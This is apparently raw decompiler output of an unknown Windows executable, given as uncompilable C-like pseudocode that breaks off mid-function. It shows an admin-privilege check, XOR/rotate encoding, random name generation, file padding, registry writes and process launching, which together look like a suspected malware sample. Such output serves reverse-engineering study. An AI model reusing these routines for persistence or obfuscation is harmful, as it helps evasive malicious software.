word32 g_dw40D6EC = 0xDA40; // 0040D6EC
word32 g_dw40D6F0 = 55890; // 0040D6F0
word32 g_dw40D6F4 = 55902; // 0040D6F4
word32 g_dw40D6F8 = 0xDA6A; // 0040D6F8
word32 g_dw40D6FC = 0xDA0A; // 0040D6FC
word32 g_dw40D700 = 55860; // 0040D700
word32 g_dw40D704 = 55964; // 0040D704
word32 g_dw40D708 = 55986; // 0040D708
word32 g_dw40D70C = 55998; // 0040D70C
word32 g_dw40D710 = 0xDACE; // 0040D710
word32 g_dw40D714 = 0xDAE0; // 0040D714
word32 g_dw40D718 = 0xD9D0; // 0040D718
word32 g_dw40D71C = 55934; // 0040D71C
word32 g_dw40D720 = 55950; // 0040D720
word32 g_dw40D724 = 55796; // 0040D724
word32 g_dw40D728 = 56110; // 0040D728
word32 g_dw40D72C = 0xDB40; // 0040D72C
word32 g_dw40D730 = 56150; // 0040D730
word32 g_dw40D734 = 0xDB6A; // 0040D734
word32 g_dw40D738 = 0xDB82; // 0040D738
word32 g_dw40D73C = 0xDB92; // 0040D73C
word32 g_dw40D740 = 56226; // 0040D740
word32 g_dw40D744 = 0xDBB0; // 0040D744
word32 g_dw40D748 = 56262; // 0040D748
word32 g_dw40D74C = 0xDBD8; // 0040D74C
word32 g_dw40D750 = 0xDBF4; // 0040D750
word32 g_dw40D754 = 0xDC04; // 0040D754
word32 g_dw40D758 = 55774; // 0040D758
word32 g_dw40D75C = 55716; // 0040D75C
word32 g_dw40D760 = 55748; // 0040D760
word32 g_dw40D764 = 55732; // 0040D764
word32 g_dw40D768 = 0xDAF0; // 0040D768
word32 g_dw40D76C = 56066; // 0040D76C
word32 g_dw40D770 = 55670; // 0040D770
word32 g_dw40D774 = 0xD870; // 0040D774
word32 g_dw40D778 = 55440; // 0040D778
word32 g_dw40D77C = 0xD992; // 0040D77C
word32 g_dw40D780 = 55684; // 0040D780
word32 g_dw40D784 = 55614; // 0040D784
word32 g_dw40D788 = 0xD960; // 0040D788
word32 g_dw40D78C = 0xD950; // 0040D78C
word32 g_dw40D790 = 55548; // 0040D790
word32 g_dw40D794 = 55598; // 0040D794
word32 g_dw40D798 = 55576; // 0040D798
word32 g_dw40D79C = 55498; // 0040D79C
word32 g_dw40D7A0 = 55532; // 0040D7A0
word32 g_dw40D7A4 = 55518; // 0040D7A4
word32 g_dw40D7A8 = 55456; // 0040D7A8
word32 g_dw40D7AC = 55478; // 0040D7AC
word32 g_dw40D7B0 = 55470; // 0040D7B0
word32 g_dw40D7B4 = 0xDB10; // 0040D7B4
word32 g_dw40D7B8 = 0xDB1E; // 0040D7B8
word32 g_dw40D7BC = 55422; // 0040D7BC
word32 g_dw40D7C0 = 57004; // 0040D7C0
word32 g_dw40D7C4 = 56988; // 0040D7C4
word32 g_dw40D7C8 = 0xE00E; // 0040D7C8
word32 g_dw40D7CC = 0xDFFE; // 0040D7CC
word32 g_dw40D7D0 = 0xDFF0; // 0040D7D0
word32 g_dw40D7D4 = 0xDFE0; // 0040D7D4
word32 g_dw40D7D8 = 0xDFCE; // 0040D7D8
word32 g_dw40D7DC = 57276; // 0040D7DC
word32 g_dw40D7E0 = 0xDFB0; // 0040D7E0
word32 g_dw40D7E4 = 57250; // 0040D7E4
word32 g_dw40D7E8 = 0xDF94; // 0040D7E8
word32 g_dw40D7EC = 57222; // 0040D7EC
word32 g_dw40D7F0 = 0xDF78; // 0040D7F0
word32 g_dw40D7F4 = 0xDF68; // 0040D7F4
word32 g_dw40D7F8 = 0xDE46; // 0040D7F8
word32 g_dw40D7FC = 56922; // 0040D7FC
word32 g_dw40D800 = 0xDE6C; // 0040D800
word32 g_dw40D804 = 56954; // 0040D804
word32 g_dw40D808 = 56966; // 0040D808
word32 g_dw40D80C = 0xDE90; // 0040D80C
word32 g_dw40D810 = 57174; // 0040D810
word32 g_dw40D814 = 57020; // 0040D814
word32 g_dw40D818 = 0xDEC8; // 0040D818
word32 g_dw40D81C = 0xDED4; // 0040D81C
word32 g_dw40D820 = 0xDEF0; // 0040D820
word32 g_dw40D824 = 0xDF0A; // 0040D824
word32 g_dw40D828 = 0xDF24; // 0040D828
word32 g_dw40D82C = 0xDF3C; // 0040D82C
word32 g_dw40D834 = 0xDE2E; // 0040D834
word32 g_dw40D838 = 56858; // 0040D838
word32 g_dw40D83C = 0xDE0A; // 0040D83C
word32 g_dw40D844 = 0x80000034; // 0040D844
word32 g_dw40D848 = 0x80000003; // 0040D848
word32 g_dw40D84C = 0x80000074; // 0040D84C
word32 g_dw40D850 = 0x80000010; // 0040D850
word32 g_dw40D854 = 0x80000013; // 0040D854
word32 g_dw40D858 = 0x80000009; // 0040D858
word32 g_dw40D85C = 0x80000004; // 0040D85C
word32 g_dw40D860 = 0x8000006F; // 0040D860
word32 g_dw40D864 = 0x80000073; // 0040D864
word32 g_dw40D868 = 0x80000017; // 0040D868
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

DWORD g_t4015FF(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 004015FF
// 0040174B: void fn0040174B()
// Called from:
//      fn00403E63
//      fn00404FC5
//      fn00405108
//      fn00405705
//      fn00405B0F
void fn0040174B()
{
}

// 0040174E: Register Eq_2 fn0040174E(Register (ptr32 Eq_3) ecx, Stack Eq_2 dwArg04, Stack (ptr32 Eq_2) dwArg08, Stack word32 dwArg0C)
// Called from:
//      fn00403E63
//      fn00404FC5
//      fn00405108
//      fn00405705
//      fn00405B0F
Eq_2 fn0040174E(struct Eq_3 * ecx, Eq_2 dwArg04, union Eq_2 * dwArg08, word32 dwArg0C)
{
	Eq_2 tLoc08;
	&tLoc08.u0->dw0000 = ecx;
	&tLoc08.u0->dw0000 = 0x00;
	ecx->t0000.u0 = 0x00;
	ecx->t0004.u0 = 0x00;
	ecx->t0008.u0 = 0x00;
	Eq_2 eax_33 = 0x80000000;
	Eq_2 ebx_34 = 0x02;
	Eq_2 dwLoc0C_173 = 0x04;
	if (dwArg0C == 0x00)
	{
		&eax_33.u0->dw0000 = 0xC0000000;
		&ebx_34.u0->dw0000 = 0x04;
		&dwLoc0C_173.u0->dw0000 = 0x02;
	}
	Eq_2 eax_121;
	if (dwArg04 != 0x00)
	{
		Eq_2 eax_66 = CreateFileA(dwArg04, eax_33, 0x01, null, 0x03, 0x20, 0x00);
		ecx->t0000.u0 = (BOOL) eax_66;
		if (eax_66 == ~0x00)
			goto l004017FF;
		Eq_2 eax_77 = GetFileSize(eax_66, &tLoc08);
		ecx->t000C.u0 = (BOOL) eax_77;
		if (tLoc08 != 0x00)
		{
l004017D2:
			CloseHandle(ecx->t0000.u0);
			goto l004017FF;
		}
		if (dwArg08 != null)
			dwArg08->u0 = (BOOL) eax_77;
	}
	Eq_2 eax_104 = CreateFileMappingA(ecx->t0000.u0, null, ebx_34, 0x00, 0x00, 0x00);
	ecx->t0004.u0 = (BOOL) eax_104;
	if (eax_104 != 0x00)
	{
		eax_121 = MapViewOfFile(eax_104, dwLoc0C_173, 0x00, 0x00, 0x00);
		ecx->t0008.u0 = (BOOL) eax_121;
		if (eax_121 != 0x00)
			return eax_121;
		CloseHandle(ecx->t0004.u0);
		CloseHandle(ecx->t0000.u0);
l004017FF:
		&eax_121.u0->dw0000 = 0x00;
		return eax_121;
	}
	goto l004017D2;
}

// 00401808: void fn00401808(Register (ptr32 Eq_145) ecx)
// Called from:
//      fn00403E63
//      fn00404FC5
//      fn00405108
//      fn00405705
//      fn00405B0F
void fn00401808(struct Eq_145 * ecx)
{
	Eq_2 eax_12 = ecx->t0008.u0;
	if (eax_12 != 0x00)
		UnmapViewOfFile(eax_12);
	Eq_2 eax_23 = ecx->t0004.u0;
	if (eax_23 != 0x00)
		CloseHandle(eax_23);
	Eq_2 eax_36 = ecx->t0000.u0;
	if (eax_36 != 0x00)
		CloseHandle(eax_36);
	ecx->t0000.u0 = 0x00;
	ecx->t0004.u0 = 0x00;
	ecx->t0008.u0 = 0x00;
}

// 00402680: Register word32 fn00402680(Stack (ptr32 word32) dwArg04, Register out Eq_2 ediOut)
// Called from:
//      fn004055FE
word32 fn00402680(word32 * dwArg04, union Eq_2 & ediOut)
{
	ptr32 fp;
	Eq_192 tLoc2C;
	Eq_2 tLoc1C;
	Eq_2 tLoc18;
	Eq_2 tLoc14;
	Eq_196 tLoc50;
	Eq_196 tLoc54;
	struct Eq_198 * esp_102;
	Eq_2 eax_18 = GetCurrentProcessId();
	&tLoc14.u0->dw0000 = 0x00;
	Mem31[&tLoc2C + 0x00:byte] = 0x00;
	tLoc2C.b0001 = 0x00;
	tLoc2C.b0002 = 0x00;
	tLoc2C.b0003 = 0x00;
	tLoc2C.b0004 = 0x00;
	tLoc2C.b0005 = 0x05;
	&tLoc1C.u0->dw0000 = 0x00;
	&tLoc18.u0->dw0000 = 0x00;
	*dwArg04 = 0x00;
	Eq_2 eax_42 = OpenProcess(0x001F0FFF, 0x00, eax_18);
	Eq_2 dwLoc0C_346 = 0x00;
	word32 dwLoc20_348 = 0x00;
	if (OpenProcessToken(eax_42, 0x08, &tLoc14) == 0x00)
	{
l004026E3:
		GetLastError();
		esp_102 = fp - 0x40;
		goto l004026E9;
	}
	Eq_2 eax_63 = LocalAlloc(0x00, 0x32);
	dwLoc0C_346 = eax_63;
	if (eax_63 == 0x00)
		goto l004026E3;
	esp_102 = fp - 0x44;
	if (GetTokenInformation(tLoc14, tLoc50, 0x02, eax_63, (DWORD *) 0x32) != 0x00)
	{
l00402757:
		struct Eq_314 * esp_128 = esp_102 - 4;
		esp_128->ptr0000 = &tLoc1C;
		esp_128->tFFFFFFFC.u0 = 0x00;
		esp_128->tFFFFFFF8.u0 = 0x00;
		esp_128->tFFFFFFF4.u0 = 0x00;
		esp_128->tFFFFFFF0.u0 = 0x00;
		esp_128->tFFFFFFEC.u0 = 0x00;
		esp_128->tFFFFFFE8.u0 = 0x00;
		esp_128->tFFFFFFE4.u0 = 0x00;
		esp_128->tFFFFFFE0.u0 = 0x04;
		esp_128->tFFFFFFDC.u0 = 0x01;
		esp_128->tFFFFFFD8 = &tLoc2C;
		esp_102 = (struct Eq_198 *) ((char *) &esp_128->ptr0000 + 4);
		if (AllocateAndInitializeSid(esp_128->tFFFFFFD8, esp_128->tFFFFFFDC.u1, esp_128->tFFFFFFE0.u0, esp_128->tFFFFFFE4.u0, esp_128->tFFFFFFE8.u0, esp_128->tFFFFFFEC.u0, esp_128->tFFFFFFF0.u0, esp_128->tFFFFFFF4.u0, esp_128->tFFFFFFF8.u0, esp_128->tFFFFFFFC.u0, esp_128->ptr0000) != 0x00)
		{
			esp_128->ptr0000 = &tLoc18;
			esp_128->tFFFFFFFC.u0 = 0x00;
			esp_128->tFFFFFFF8.u0 = 0x00;
			esp_128->tFFFFFFF4.u0 = 0x00;
			esp_128->tFFFFFFF0.u0 = 0x00;
			esp_128->tFFFFFFEC.u0 = 0x00;
			esp_128->tFFFFFFE8.u0 = 0x00;
			esp_128->tFFFFFFE4.u0 = 0x00;
			esp_128->tFFFFFFE0.u0 = 0x06;
			esp_128->tFFFFFFDC.u0 = 0x01;
			esp_128->tFFFFFFD8 = &tLoc2C;
			esp_102 = (struct Eq_198 *) ((char *) &esp_128->ptr0000 + 4);
			if (AllocateAndInitializeSid(esp_128->tFFFFFFD8, esp_128->tFFFFFFDC.u1, esp_128->tFFFFFFE0.u0, esp_128->tFFFFFFE4.u0, esp_128->tFFFFFFE8.u0, esp_128->tFFFFFFEC.u0, esp_128->tFFFFFFF0.u0, esp_128->tFFFFFFF4.u0, esp_128->tFFFFFFF8.u0, esp_128->tFFFFFFFC.u0, esp_128->ptr0000) != 0x00)
			{
				up32 dwArg04_373 = 0x00;
				if (dwLoc0C_346.u0->dw0000 > 0x00)
				{
					word32 esi_192 = dwLoc0C_346 + 0x04;
					do
					{
						struct Eq_597 * esp_198 = esp_102 - 4;
						esp_198->t0000.u0 = (BOOL) tLoc1C;
						Eq_2 eax_201 = esi_192.u0->dw0000;
						esp_198->tFFFFFFFC.u0 = (BOOL) eax_201;
						if (EqualSid(esp_198->tFFFFFFFC, esp_198->t0000) != 0x00)
						{
							*dwArg04 = 0x00;
							dwLoc20_348 = 0x01;
							break;
						}
						esp_198->t0000.u0 = (BOOL) tLoc18;
						esp_198->tFFFFFFFC.u0 = (BOOL) eax_201;
						if (EqualSid(esp_198->tFFFFFFFC, esp_198->t0000) != 0x00)
						{
							*dwArg04 = 0x01;
							dwLoc20_348 = 0x00;
							break;
						}
						up32 v29_231 = dwArg04_373 + 0x01;
						dwArg04_373 = v29_231;
						esi_192 += 0x08;
					} while (v29_231 < (dwLoc0C_346.u0)->dw0000);
				}
				if (*dwArg04 == 0x00 && dwLoc20_348 == 0x00)
					*dwArg04 = 0x01;
l00402803:
				if (tLoc18 != 0x00)
				{
					union Eq_2 * esp_272 = esp_102 - 4;
					esp_272->u0 = (BOOL) tLoc18;
					FreeSid(*esp_272);
				}
				struct Eq_198 * esp_282 = esp_102;
				if (tLoc1C != 0x00)
				{
					esp_282 = esp_102 - 4;
					esp_282->t0000.u0 = (BOOL) tLoc1C;
					FreeSid(esp_282->t0000);
				}
				if (dwLoc0C_346 != 0x00)
				{
					union Eq_2 * esp_294 = esp_282 - 4;
					esp_294->u0 = (BOOL) dwLoc0C_346;
					LocalFree(*esp_294);
				}
				if (tLoc14 != 0x00)
				{
					union Eq_2 * esp_306 = esp_282 - 4;
					esp_306->u0 = (BOOL) tLoc14;
					CloseHandle(*esp_306);
				}
				struct Eq_198 * esp_316 = esp_282;
				if (eax_42 != 0x00)
				{
					esp_316 = esp_282 - 4;
					esp_316->t0000.u0 = (BOOL) eax_42;
					CloseHandle(esp_316->t0000);
				}
				word32 ebx_329 = esp_316->dw0008;
				&ediOut.u0->dw0000 = esp_316->t0000.u0;
				return ebx_329;
			}
		}
		goto l00402791;
	}
	else
	{
		if (GetLastError() == 122)
		{
			LocalFree(eax_63);
			Eq_2 eax_101 = LocalAlloc(0x00, 0x32);
			esp_102 = fp - 0x44;
			dwLoc0C_346 = eax_101;
			if (eax_101 != 0x00)
			{
				esp_102 = fp - 0x48;
				if (GetTokenInformation(tLoc14, tLoc54, 0x02, eax_101, (DWORD *) 0x32) != 0x00)
					goto l00402757;
			}
		}
l00402791:
		GetLastError();
l004026E9:
		goto l00402803;
	}
}

// 0040347E: Register Eq_2 fn0040347E(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00403CE3
//      fn00404A18
//      fn004055FE
//      fn004057BE
//      fn00406DFD
Eq_2 fn0040347E(Eq_2 dwArg04, Eq_2 dwArg08)
{
	Eq_2 esi_16 = dwArg04;
	Eq_2 edi_11 = 0x00;
	if (dwArg08 > 0x00)
	{
		while (fn00407840(esi_16) != 0x00)
		{
			&edi_11.u0->dw0000 = &edi_11.u5->b0001;
			esi_16 = esi_16 + 1 + fn00407840(esi_16);
			if (edi_11 >= dwArg08)
				return esi_16;
		}
	}
	return esi_16;
}

// 004035A1: void fn004035A1(Stack word32 dwArg04)
// Called from:
//      fn00405705
void fn004035A1(word32 dwArg04)
{
	int32 edi_10;
	for (edi_10 = 0x00; edi_10 < 0x04; ++edi_10)
	{
		byte dl_40 = (byte) ((uint64) fn004047B6(0x00) % ((0x00 - (word32) (edi_10 != 0x00) & 0xF8) + 0x08));
		byte * eax_39 = dwArg04 + edi_10;
		*eax_39 = dl_40;
		if (dl_40 == 0x00)
			*eax_39 = 0x01;
	}
}

// 004035D8: void fn004035D8(Stack word32 dwArg04, Stack int32 dwArg08, Stack (ptr32 Eq_802) dwArg0C)
// Called from:
//      fn00405705
void fn004035D8(word32 dwArg04, int32 dwArg08, struct Eq_802 * dwArg0C)
{
	int32 dwLoc0C_106 = 0x00;
	byte cl_17 = dwArg0C->b0000;
	byte al_18 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			ui8 * eax_32 = dwArg04 + dwLoc0C_106;
			*eax_32 = __rol<byte,byte>(*eax_32, cl_17) ^ al_18;
			int32 v21_83 = dwLoc0C_106 + 0x01;
			dwLoc0C_106 = v21_83;
		} while (v21_83 < dwArg08);
	}
}

// 00403634: void fn00403634(Stack Eq_2 dwArg04, Stack int32 dwArg08, Stack (ptr32 Eq_835) dwArg0C)
// Called from:
//      fn004055FE
//      fn00405705
void fn00403634(Eq_2 dwArg04, int32 dwArg08, struct Eq_835 * dwArg0C)
{
	int32 dwLoc0C_106 = 0x00;
	byte cl_17 = dwArg0C->b0000;
	byte al_18 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			byte * eax_32 = dwArg04.u0 + dwLoc0C_106 / 0x00001000;
			*eax_32 = __ror<byte,byte>(*eax_32 ^ al_18, cl_17);
			int32 v21_83 = dwLoc0C_106 + 0x01;
			dwLoc0C_106 = v21_83;
		} while (v21_83 < dwArg08);
	}
}

// 00403690: Register byte fn00403690(Stack Eq_2 dwArg04)
// Called from:
//      fn0040372F
byte fn00403690(Eq_2 dwArg04)
{
	uint32 eax_161;
	byte bl_43 = (byte) dwArg04;
	uint32 esi_112 = (uint32) ((uint64) fn004047B6(0x00) % 0x1A) + 0x61;
	if (dwArg04 != 0x04)
	{
		if (dwArg04 == 0x01)
		{
			eax_161 = (uint32) ((uint64) fn004047B6(0x00) % 0x0A) + 0x30;
			return (byte) eax_161;
		}
		if ((bl_43 & 0x02) != 0x00)
			esi_112 = (uint32) ((uint64) fn004047B6(0x00) % 0x1A) + 0x41;
		if (((byte) fn004047B6(0x00) & 0x01) != 0x00 && (bl_43 & 0x04) != 0x00)
			esi_112 = (uint32) ((uint64) fn004047B6(0x00) % 0x1A) + 0x61;
		if (((byte) fn004047B6(0x00) & 0x01) != 0x00 && (bl_43 & 0x01) != 0x00)
			esi_112 = (uint32) ((uint64) fn004047B6(0x00) % 0x0A) + 0x30;
	}
	eax_161 = esi_112;
	return (byte) eax_161;
}

// 0040372F: void fn0040372F(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack Eq_2 dwArg10)
// Called from:
//      fn00404A18
void fn0040372F(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, Eq_2 dwArg10)
{
	Eq_2 esi_15 = dwArg08;
	if (dwArg0C > dwArg08)
		&esi_15.u0->dw0000 = dwArg08.u0 + (uint32) ((uint64) fn004047B6(0x00) % (dwArg0C - dwArg08)) / 0x00001000;
	Eq_2 edi_40 = 0x00;
	if (esi_15 > 0x00)
	{
		do
		{
			Mem63[edi_40 + dwArg04:byte] = fn00403690(dwArg10);
			&edi_40.u0->dw0000 = &edi_40.u5->b0001;
		} while (edi_40 < esi_15);
	}
	dwArg04.u2->u0 = fn00403690(0x02);
	Mem88[edi_40 + dwArg04:byte] = 0x00;
}

// 00403CE3: void fn00403CE3(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00404A18
void fn00403CE3(Eq_2 dwArg04, Eq_2 dwArg08)
{
	fn00407750(dwArg04, 4260434);
	fn00407760(dwArg04, fn0040347E(4260434, dwArg08));
}

// 00403DC6: void fn00403DC6(Stack Eq_2 tArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C)
// Called from:
//      fn00405B0F
void fn00403DC6(Eq_2 tArg04, Eq_2 dwArg08, Eq_2 dwArg0C)
{
	Eq_2 eax_30 = CreateFileA(tArg04, 0xC0000000, 0x03, null, 0x02, 0x20, 0x00);
	&tArg04.u0->dw0000 = 0x00;
	if (eax_30 != ~0x00 && dwArg08 != 0x00)
	{
		WriteFile(eax_30, dwArg08, dwArg0C, &tArg04, null);
		CloseHandle(eax_30);
	}
}

// 00403E63: Register word32 fn00403E63(Stack Eq_2 dwArg04)
// Called from:
//      fn00404A18
word32 fn00403E63(Eq_2 dwArg04)
{
	Eq_1051 tLoc18;
	Eq_1052 tLoc08;
	fn0040174B();
	if (fn0040174E(&tLoc18, dwArg04, &tLoc08, 0x01) == null)
		return 0x00;
	fn00401808(&tLoc18);
	return 0x01;
}

// 00403F05: void fn00403F05(Stack Eq_2 dwArg04)
// Called from:
//      fn00405B0F
void fn00403F05(Eq_2 dwArg04)
{
	SetFileAttributesA(dwArg04, 0x20);
	DeleteFileA(dwArg04);
}

// 0040406E: Register word32 fn0040406E(Register (ptr32 Eq_1082) ecx, Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Register out ptr32 esiOut, Register out (ptr32 code) ediOut)
// Called from:
//      fn00404FC5
//      fn00406DFD
word32 fn0040406E(struct Eq_1082 * ecx, Eq_2 dwArg04, Eq_2 dwArg08, ptr32 & esiOut, <anonymous> & ediOut)
{
	ptr32 fp;
	Eq_2 tLoc08;
	<anonymous> ** esp_156;
	&tLoc08.u0->dw0000 = ecx;
	if (dwArg08 >= 0x00015000)
	{
		SetFileAttributesA(dwArg04, 0x20);
		Eq_2 eax_45 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x03, 0x20, 0x00);
		if (eax_45 != ~0x00)
		{
			ptr32 esp_126;
			Eq_2 eax_55 = GetFileSize(eax_45, &tLoc08);
			if (eax_55 > dwArg08)
			{
				SetFilePointer(eax_45, dwArg08, null, 0x00);
				SetEndOfFile(eax_45);
				esp_126 = fp - 0x14;
			}
			else
			{
				SetFilePointer(eax_45, 0x00, null, 0x02);
				int32 eax_71 = dwArg08 - eax_55;
				int32 eax_80 = (int32) ((int64) eax_71 /32 0x00080000);
				if (eax_80 > 0x00)
				{
					int32 dwArg08_199 = eax_80;
					do
					{
						WriteFile(eax_45, 4272592, 0x00080000, &tLoc08, null);
						int32 v23_102 = dwArg08_199 - 0x01;
						dwArg08_199 = v23_102;
					} while (v23_102 != 0x00);
				}
				WriteFile(eax_45, 4272592, (int32) ((int64) eax_71 % 0x00080000), &tLoc08, null);
				esp_126 = fp - 0x28;
			}
			union Eq_2 * esp_148 = esp_126 - 4;
			esp_148->u0 = (BOOL) eax_45;
			CloseHandle(*esp_148);
			esp_148->u0 = 0x01;
			esp_156 = (<anonymous> **) ((char *) esp_148 + 4);
l00404133:
			struct Eq_1132 * esp_166 = (char *) esp_156 + 4;
			<anonymous> * edi_165 = *esp_156;
			word32 ebx_169 = esp_166->dw0004;
			esiOut = esp_166->ptr0000;
			ediOut = edi_165;
			return ebx_169;
		}
	}
	esp_156 = fp - 20;
	goto l00404133;
}

// 0040464B: void fn0040464B(Stack Eq_2 dwArg04, Stack Eq_2 tArg08, Stack Eq_2 dwArg0C, Stack Eq_2 dwArg10)
// Called from:
//      fn00406DFD
void fn0040464B(Eq_2 dwArg04, Eq_2 tArg08, Eq_2 dwArg0C, Eq_2 dwArg10)
{
	if (RegCreateKeyA(dwArg04, tArg08, &tArg08) != 0x00)
		return;
	RegSetValueExA(tArg08, dwArg0C, 0x00, 0x01, dwArg10, fn00407840(dwArg10));
	RegCloseKey(tArg08);
}

// 00404691: void fn00404691(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_1248 dwArg0C, Stack Eq_2 dwArg10)
// Called from:
//      fn00404A18
void fn00404691(Eq_2 dwArg04, Eq_2 dwArg08, Eq_1248 dwArg0C, Eq_2 dwArg10)
{
	ptr32 fp;
	Eq_1281 tLoc0110;
	Eq_2 tLoc08;
	ui32 dwLoc0C;
	Eq_2 esi_15 = 0x00;
	ptr32 esp_107 = fp - 0x0114;
	if (RegOpenKeyA(dwArg04, dwArg08, &tLoc08) == 0x00)
	{
		while (true)
		{
			struct Eq_1298 * esp_31 = esp_107 - 4;
			esp_31->t0000.u0 = 0x0104;
			esp_31->tFFFFFFFC.u0 = (BOOL) &tLoc0110;
			esp_31->tFFFFFFF8.u0 = (BOOL) esi_15;
			esp_31->tFFFFFFF4.u0 = (BOOL) tLoc08;
			Eq_1248 eax_41 = RegEnumKeyA(esp_31->tFFFFFFF4.u7, esp_31->tFFFFFFF8.u0, esp_31->tFFFFFFFC, esp_31->t0000.u0);
			esp_107 = (char *) &esp_31->t0000 + 4;
			if (eax_41 != 0x00)
				break;
			if (dwArg0C != eax_41)
			{
				ui32 v16_53 = dwLoc0C & eax_41;
				esp_31->t0000.u0 = (BOOL) dwArg10;
				esp_31->tFFFFFFFC.u0 = (BOOL) (fp - 0x0C);
				esp_31->tFFFFFFF8.u0 = (BOOL) &tLoc0110;
				esp_31->tFFFFFFF4.u0 = (BOOL) dwArg08;
				esp_31->tFFFFFFF0.u0 = (BOOL) dwArg04;
				word32 esp_74;
				dwArg0C();
				dwLoc0C = v16_53;
				esp_107 = esp_74 + 0x14;
				if (v16_53 != 0x00)
					goto l00404701;
			}
			&esi_15.u0->dw0000 = &esi_15.u5->b0001;
		}
		esp_31->t0000.u0 = 0x01;
		esp_107 = (char *) &esp_31->t0000 + 4;
l00404701:
		union Eq_2 * esp_86 = esp_107 - 4;
		esp_86->u0 = (BOOL) tLoc08;
		RegCloseKey(esp_86->u7);
	}
}

// 0040470F: Register word32 fn0040470F(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_1248 dwArg0C, Stack Eq_2 dwArg10)
// Called from:
//      fn00404A18
word32 fn0040470F(Eq_2 dwArg04, Eq_2 dwArg08, Eq_1248 dwArg0C, Eq_2 dwArg10)
{
	ptr32 fp;
	Eq_1281 tLoc0418;
	Eq_2 tLoc08;
	word32 dwLoc18;
	ui32 dwLoc10;
	Eq_2 ebx_116 = 0x00;
	struct Eq_1406 * esp_101 = fp - 0x0820;
	if (RegOpenKeyA(dwArg04, dwArg08, &tLoc08) == 0x00)
	{
		while (true)
		{
			struct Eq_1418 * esp_39 = esp_101 - 4;
			esp_39->t0000.u0 = (BOOL) (fp - 0x0C);
			esp_39->tFFFFFFFC = fp + ~0x0817;
			esp_39->tFFFFFFF8.u0 = (BOOL) (fp - 24);
			esp_39->tFFFFFFF4.u0 = 0x00;
			esp_39->tFFFFFFF0.u0 = (BOOL) (fp - 20);
			esp_39->tFFFFFFEC.u0 = (BOOL) &tLoc0418;
			esp_39->tFFFFFFE8.u0 = (BOOL) ebx_116;
			esp_39->tFFFFFFE4.u0 = (BOOL) tLoc08;
			Eq_1248 eax_62 = RegEnumValueA(esp_39->tFFFFFFE4.u7, esp_39->tFFFFFFE8.u0, esp_39->tFFFFFFEC, esp_39->tFFFFFFF0.u8, esp_39->tFFFFFFF4.u8, esp_39->tFFFFFFF8.u8, esp_39->tFFFFFFFC, esp_39->t0000.u8);
			esp_101 = (struct Eq_1406 *) ((char *) &esp_39->t0000 + 4);
			if (eax_62 != 0x00)
				break;
			if (dwLoc18 == 0x01 && dwArg0C != eax_62)
			{
				ui32 v17_76 = dwLoc10 & eax_62;
				esp_39->t0000.u0 = (BOOL) dwArg10;
				esp_39->tFFFFFFFC = fp - 16;
				esp_39->tFFFFFFF8.u0 = (BOOL) &tLoc0418;
				esp_39->tFFFFFFF4.u0 = (BOOL) dwArg08;
				esp_39->tFFFFFFF0.u0 = (BOOL) dwArg04;
				word32 esp_97;
				dwArg0C();
				dwLoc10 = v17_76;
				esp_101 = esp_97 + 0x14;
				if (v17_76 != 0x00)
					goto l004047A7;
			}
			&ebx_116.u0->dw0000 = &ebx_116.u5->b0001;
		}
		esp_39->t0000.u0 = 0x01;
		esp_101 = (struct Eq_1406 *) ((char *) &esp_39->t0000 + 4);
l004047A7:
		union Eq_2 * esp_109 = esp_101 - 4;
		esp_109->u0 = (BOOL) tLoc08;
		RegCloseKey(esp_109->u7);
		esp_101 = (struct Eq_1406 *) ((char *) esp_109 + 4);
	}
	return esp_101[1];
}

// 004047B6: Register word32 fn004047B6(Stack word32 dwArg04)
// Called from:
//      fn004035A1
//      fn00403690
//      fn0040372F
//      fn00405522
//      fn004055FE
//      fn00406DFD
word32 fn004047B6(word32 dwArg04)
{
	if (dwArg04 != 0x00 || g_dw4131CC == 0x00)
	{
		fn00407F35(GetTickCount());
		g_dw4131CC = fn00407F3F();
	}
	return fn00407F3F();
}

// 004047E2: Register ui32 fn004047E2(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00405B0F
//      fn00406DFD
ui32 fn004047E2(Eq_2 dwArg04, Eq_2 dwArg08)
{
	Eq_1580 tLoc58;
	Eq_1581 tLoc14;
	fn004076F0(&tLoc58, 0x00, 0x44);
	tLoc58.cb = (DWORD) 0x44;
	return 0x00 - (CreateProcessA(dwArg04, dwArg08, null, null, 0x00, 0x00, 0x00, 0x00, &tLoc58, &tLoc14) != 0x00) & tLoc14.hProcess;
}

// 00404A18: Register word32 fn00404A18(Register out ptr32 ebpOut, Register out ptr32 ediOut)
// Called from:
//      fn004055FE
word32 fn00404A18(ptr32 & ebpOut, ptr32 & ediOut)
{
	ptr32 fp;
	Eq_1281 tLoc0520;
	Eq_1281 tLoc041C;
	struct Eq_1632 * ebp_115 = fp - 4;
	if (g_t4938F0.u0 == 0x00)
		fn00404691(0x80000002, fn0040347E(4260434, 0x04), 0x0040494A, fp - 8);
	else
	{
		fn00403CE3(&tLoc041C, 0x02);
		fn00407750(4797664, &tLoc041C);
		fn0040470F(0x80000002, &tLoc041C, 0x004048B6, fp - 8);
	}
	g_dw4938F4 = 0x00;
	GetSystemDirectoryA(&tLoc0520, 0x0104);
	ptr32 esp_110 = fp - 1316;
	int32 esi_111;
	for (esi_111 = 0x00; esi_111 < 0x0A; ++esi_111)
	{
		ebp_115->bFFFFFFE8 = 0x00;
		struct Eq_1725 * esp_124 = esp_110 - 4;
		esp_124->t0000.u0 = 0x0041078D;
		esp_124->tFFFFFFFC.u0 = (BOOL) (ebp_115 - 24);
		fn00407750(esp_124->tFFFFFFFC.u0, esp_124->t0000.u0);
		esp_124->t0000.u0 = 0x04;
